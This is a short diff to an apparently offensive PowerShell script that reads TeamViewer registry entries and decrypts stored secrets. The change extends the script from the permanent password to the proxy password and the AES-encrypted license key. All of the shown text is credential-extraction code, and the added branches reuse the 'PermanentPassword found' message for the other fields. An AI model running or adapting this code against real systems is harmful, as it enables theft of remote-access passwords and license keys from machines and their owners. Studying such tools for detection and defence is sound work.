@@ -34,6 +34,17 @@ function search
          Write-Host "PermanentPassword found, trying to decrypt:"
          decryptpass -encpass $TeamviewerDir.PermanentPassword
      }
+     elseif($TeamviewerDir.ProxyPasswordAES)
+     {
+         Write-Host "PermanentPassword found, trying to decrypt:"
+         decryptpass -encpass $TeamviewerDir.ProxyPasswordAES
+     }
+     elseif($TeamviewerDir.LicenseKeyAES)
+     {
+         Write-Host "PermanentPassword found, trying to decrypt:"
+         decryptpass -encpass $TeamviewerDir.LicenseKeyAES
+     }
+         
     
 }
     Write-Host "Looking for Registry entries on this system:"
